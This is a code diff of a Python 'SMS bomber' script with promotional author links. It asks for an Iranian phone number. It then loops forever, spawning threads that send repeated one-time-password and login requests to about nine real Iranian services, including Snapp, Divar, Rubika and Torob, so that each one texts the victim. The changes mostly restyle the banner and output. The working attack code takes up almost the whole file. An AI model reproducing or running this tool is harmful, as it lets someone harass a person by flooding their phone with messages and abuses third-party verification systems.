@@ -1,35 +1,73 @@
-import os
+#python script; running on python3 and linux and windows
+# imports ----------------------
+from os import system
+# try !
+try:
+    import requests
+except:
+    system('pip install requests')
+try:
+    import threading
+except:
+    system('pip install threading')
+try:
+    import colored
+except:
+    system('pip install colored')
+try:
+    from datetime import datetime
+except:
+    system('pip install datetime')
+# !
 import time
 import requests
+import sys
 from threading import Thread
-from colorama import Fore
 from time import sleep
+from colored import fg, bg, attr
+#-----
+# proxy ----
 proxy = {"https": "127.0.0.1.8000"}
-print(Fore.RED)
-print(""" sMs bOmBeR God """)
+#--------
+try:
+    system('clear')
+except:
+    system('cls')
+
+green="\033[32m"
+red ="\033[31m"
+blue="\033[36m"
+pink="\033[35m"
+yellow="\033[93m"
+darkblue="\033[34m"
+white="\033[00m"
+
+print(f"{blue}\n\n\n\n\nsMs bOmBeR God\n")
 sleep(2)
-print(Fore.GREEN)
-print("""
-▄▄▄▄▄▄   ▄▄▄    ▄▄▄   ▄▄▄▄      ▄▄▄▄    ▄▄▄   ▄▄
- ██▀▀▀▀██  ██▄  ▄██  ▄█▀▀▀▀█    ██▀▀██   ███   ██                                        ██    ██   ██▄▄██   ██▄       ██    ██  ██▀█  ██
- ███████     ▀██▀     ▀████▄   ██    ██  ██ ██ ██
- ██  ▀██▄     ██          ▀██  ██    ██  ██  █▄██
- ██    ██     ██     █▄▄▄▄▄█▀   ██▄▄██   ██   ███
- ▀▀    ▀▀▀    ▀▀      ▀▀▀▀▀      ▀▀▀▀    ▀▀   ▀▀▀
+try:
+    tm = requests.get("https://api.codebazan.ir/time-date/?td=all").text
+except:
+    tm = (datetime.today())
 
-My Id:
+s = f"""{white}|POWER BOMBER|\n\n
+  {yellow}\n⟨⟨⟨ {darkblue}date: {blue}[[ {tm} ]] {yellow}⟩⟩⟩
+{pink}
+ ____   __   __  ____     ___    _   _
+|  _ \  \ \ / / / ___|   / _ \  | \ | |
+| |_) |  \ V /  \___ \  | | | | |  \| |
+|  _ <    | |    ___) | | |_| | | |\  |
+|_| \_\   |_|   |____/   \___/  |_| \_|
 
-T.me/Creator_ryson
-T.Me/Uupdatte
-rubika.ir/Caetorr
-rubika.ir/Spansor
-rubika.ir/Conquest_rayson
-Law-ryson.Blogfa.Com
+{green}
+|t.me/creator_ryson|t.me/uupdatte            |
+|rubika.ir/caetorr |creator-rayson.blogfa.com|\n\n
+{yellow}<SMS SENDER> ~ [M.D RYSON] FROM [ASHIANEH]\n\n
+"""
+for t in s:
+    sys.stdout.write(t)
+    sys.stdout.flush()
+    time.sleep(0.01)
 
-Script the mmd ryson
-     
-     SmS bOmBeR
-""")
 
 def snap(phone):
     #snap api
@@ -38,11 +76,11 @@ def snap(phone):
     try:
         snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
         if "OK" in snapR.text:
-            print (Fore.GREEN+"[+]snap SEND")
+            print (F"{blue}[+]snap SEND")
         else:
-            print (Fore.GREEN+"[+]snap SEND")
+            print (F"{red}[!]not FOUND")
     except:
-        print ("not send")
+        print (f"{red}not send")
 
 def shad(phone):
     #shad api
@@ -51,11 +89,11 @@ def shad(phone):
     try:
         shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)
         if "OK" in shadR.text:
-            print (Fore.Green+"shad Send")
+            print (F"{green}shad Send")
         else:
-            print ("No Attack :(")
+            print (f"{red}not the found")
     except:
-        print ("No Attack  :(")
+        print (f"{red}is not attack")
 
 def gap(phone):
     #gap api
@@ -63,11 +101,11 @@ def gap(phone):
     try:
         gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH)
         if "OK" in gapR.text:
-            print ("mmd ryson :))")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print (" No Attack :(")
+            print (f"{red}not found target-!")
     except:
-        print ("No Attack  :(")
+        print (f"{red}no attack-!")
 
 def tap30(phone):
     #tap30 api
@@ -76,11 +114,11 @@ def tap30(phone):
     try:
         tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D)
         if "OK" in tap30R.text:
-            print ("mmd ryson :))")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("No Attack :(")
+            print (f"{red}not found target-!\n")
     except:
-            print ("No Attack :(")
+            print (f"{red}no attack-!\n")
 
 def emtiaz(phone):
     #emtiaz api
@@ -88,9 +126,9 @@ def emtiaz(phone):
     emD = "send=1&cellphone=0"+phone.split("+98")[1]
     try:
         emR = requests.post("https://web.emtiyaz.app/json/login", headers=emH, data=emD)
-        print ("mmd ryson :))")
+        print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
     except:
-        print ("No Attack  :(")
+        print (f"{red}no attack-!\n")
 
 def divar(phone):
     #divar api
@@ -99,11 +137,11 @@ def divar(phone):
     try:
         divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD)
         if "SENT" in divarR.text:
-            print ("mmd ryson :)) ")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("No Attack  :(")
+            print (f"{red}not found target-!")
     except:
-        print ("No Attack  :(")
+        print (f"{red}no attack-!")
 
 def rubika(phone):
     #rubika api
@@ -112,11 +150,11 @@ def rubika(phone):
     try:
         ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
         if "OK" in ruR.text:
-            print ("mmd ryson :)) ")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("No Attack :(")
+            print (f"{red}not found target-!\n")
     except:
-        print ("No Attack  :(")
+        print (f"{red}no attack-!\n")
 
 def torob(phone):
     #torob api
@@ -124,11 +162,11 @@ def torob(phone):
     try:
         torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH)
         if "sent" in torobR.text:
-            print (" mmd ryson :)) ")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print (" No Attack :(")
+            print (f"{red}not found target-!\n")
     except:
-        print (" No Attack :(")
+        print (f"{red}no attack-!\n")
 
 def bama(phone):
     #bama api
@@ -137,14 +175,14 @@ def bama(phone):
     try:
         bamaR = requests.post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)
         if "0" in bamaR.text:
-            print ("mmd ryson :)) ")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("No Attack  :(")
+            print (f"{red}not found target-!\n")
     except:
-        print (" No Attack :(")
+        print (f"{red}no attack-!\n")
 
 try:
-    phone = str(input(" Number Target (+98xxxxxxx)> "))
+    phone = str(input(f"{blue}Number Target {darkblue}(+98XXXXXXXXXX) {green}⟩⟩> {white}"))
     while True:
         Thread(target=snap, args=[phone]).start()
         Thread(target=shad, args=[phone]).start()
@@ -155,9 +193,9 @@ try:
         Thread(target=rubika, args=[phone]).start()
         Thread(target=torob, args=[phone]).start()
         Thread(target=bama, args=[phone]).start()
-        #os.system("killall -HUP tor")
+        
         
 
 
 except:
-        print("not")
+        print()
